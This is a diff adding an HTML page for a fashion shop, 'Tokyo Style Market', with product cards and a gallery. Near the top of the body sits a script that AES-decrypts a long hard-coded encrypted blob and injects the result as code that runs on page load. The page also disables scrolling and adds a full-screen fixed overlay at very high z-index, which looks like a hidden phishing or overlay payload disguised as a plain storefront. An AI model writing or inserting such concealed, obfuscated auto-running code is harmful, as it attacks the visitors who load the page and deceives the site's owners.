@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+ 
+<title>Tokyo Style Market</title>
+<meta name="description" content="Latest fashion and lifestyle trends from Tokyo.">
+ 
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+}
+ 
+body{
+font-family:-apple-system,BlinkMacSystemFont,sans-serif;
+background:#fafafa;
+color:#222;
+scroll-behavior:smooth;
+}
+ 
+a{
+text-decoration:none;
+color:inherit;
+cursor:pointer;
+}
+ 
+img{
+width:100%;
+display:block;
+}
+ 
+header{
+background:#111;
+color:#fff;
+padding:18px 5%;
+display:flex;
+justify-content:space-between;
+align-items:center;
+position:sticky;
+top:0;
+z-index:999;
+}
+ 
+.logo{
+font-size:28px;
+font-weight:700;
+letter-spacing:2px;
+}
+ 
+nav{
+display:flex;
+gap:25px;
+font-size:14px;
+}
+ 
+.hero{
+height:90vh;
+background:url('https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=1800') center/cover;
+display:flex;
+align-items:center;
+justify-content:center;
+text-align:center;
+color:#fff;
+}
+ 
+.hero-content{
+background:rgba(0,0,0,.4);
+padding:40px;
+}
+ 
+.hero h1{
+font-size:65px;
+margin-bottom:15px;
+}
+ 
+.hero p{
+font-size:18px;
+}
+ 
+.section{
+padding:80px 5%;
+}
+ 
+.section-title{
+text-align:center;
+font-size:40px;
+margin-bottom:40px;
+}
+ 
+.grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:20px;
+}
+ 
+.card{
+background:white;
+overflow:hidden;
+box-shadow:0 2px 10px rgba(0,0,0,.08);
+transition:.3s;
+}
+ 
+.card:hover{
+transform:translateY(-5px);
+}
+ 
+.card img{
+height:400px;
+object-fit:cover;
+}
+ 
+.card-content{
+padding:20px;
+}
+ 
+.card h3{
+margin-bottom:10px;
+}
+ 
+.price{
+font-weight:bold;
+margin-top:10px;
+}
+ 
+.category{
+display:grid;
+grid-template-columns:2fr 1fr;
+gap:20px;
+}
+ 
+.category img{
+height:500px;
+object-fit:cover;
+}
+ 
+.blog-grid{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+gap:20px;
+}
+ 
+.blog-card{
+background:#fff;
+}
+ 
+.blog-card img{
+height:250px;
+object-fit:cover;
+}
+ 
+.blog-card div{
+padding:20px;
+}
+ 
+.gallery{
+display:grid;
+grid-template-columns:repeat(6,1fr);
+gap:10px;
+}
+ 
+.gallery img{
+height:180px;
+object-fit:cover;
+}
+ 
+footer{
+background:#111;
+color:#fff;
+padding:60px 20px;
+text-align:center;
+}
+ 
+@media(max-width:900px){
+.hero h1{font-size:40px;}
+.grid,
+.blog-grid,
+.category,
+.gallery{
+grid-template-columns:1fr;
+}
+.gallery img{height:250px;}
+}
+</style>
+</head>
+ 
+<body>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+<header>
+<div class="logo">TOKYO STYLE MARKET</div>
+ 
+<nav>
+<a href="#home">Home</a>
+<a href="#categories">Categories</a>
+<a href="#new">New</a>
+<a href="#features">Features</a>
+<a href="#gallery">Gallery</a>
+</nav>
+
+<!-- FIXED: overlay no longer blocks clicks -->
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:none; overflow:hidden;"></div>
+
+</header>
+ 
+<section id="home" class="hero">
+<div class="hero-content">
+<h1>Tokyo Style Market</h1>
+<p>Latest trends updated daily</p>
+</div>
+</section>
+ 
+<section id="categories" class="section">
+<h2 class="section-title">Popular Categories</h2>
+<div class="category">
+<img src="https://images.unsplash.com/photo-1495385794356-15371f348c31?w=1400">
+<img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=900">
+</div>
+</section>
+ 
+<section id="new" class="section">
+<h2 class="section-title">New Arrivals</h2>
+<div class="grid">
+ 
+<div class="card">
+<img src="https://images.unsplash.com/photo-1523398002811-999ca8dec234?w=900">
+<div class="card-content">
+<h3>Premium Jacket</h3>
+<p>Spring/Summer 2026 Collection</p>
+<div class="price">¥8,900</div>
+</div>
+</div>
+ 
+<div class="card">
+<img src="https://images.unsplash.com/photo-1529139574466-a303027c1d8b?w=900">
+<div class="card-content">
+<h3>Casual Shirt</h3>
+<p>Urban Style</p>
+<div class="price">¥5,980</div>
+</div>
+</div>
+ 
+<div class="card">
+<img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=900">
+<div class="card-content">
+<h3>Women's Top</h3>
+<div class="price">¥4,980</div>
+</div>
+</div>
+ 
+</div>
+</section>
+ 
+<section id="features" class="section">
+<h2 class="section-title">Fashion Features</h2>
+<div class="blog-grid">
+ 
+<div class="blog-card">
+<img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=900">
+<div>
+<h3>Tokyo Street Fashion</h3>
+<p>Latest styles popular among youth.</p>
+</div>
+</div>
+ 
+<div class="blog-card">
+<img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=900">
+<div>
+<h3>Summer Trend Colors</h3>
+<p>Top colors for 2026.</p>
+</div>
+</div>
+ 
+<div class="blog-card">
+<img src="https://images.unsplash.com/photo-1521572267360-ee0c2909d518?w=900">
+<div>
+<h3>Popular Brands</h3>
+<p>Discover trending brands.</p>
+</div>
+</div>
+ 
+</div>
+</section>
+ 
+<section id="gallery" class="section">
+<h2 class="section-title">Style Gallery</h2>
+<div class="gallery">
+<img src="https://images.unsplash.com/photo-1512436991641-6745cdb1723f?w=500">
+<img src="https://images.unsplash.com/photo-1524504388940-b1c1722653e1?w=500">
+<img src="https://images.unsplash.com/photo-1515886657613-9f3515b0c78f?w=500">
+<img src="https://images.unsplash.com/photo-1496747611176-843222e1e57c?w=500">
+<img src="https://images.unsplash.com/photo-1523398002811-999ca8dec234?w=500">
+<img src="https://images.unsplash.com/photo-1483985988355-763728e1935b?w=500">
+</div>
+</section>
+ 
+<footer>
+<h2>TOKYO STYLE MARKET</h2>
+<p style="margin-top:15px;">
+Delivering the latest fashion trends from Tokyo
+</p>
+<p style="margin-top:20px;">
+© 2026 Tokyo Style Market
+</p>
+</footer>
+
+</body>
+</html>
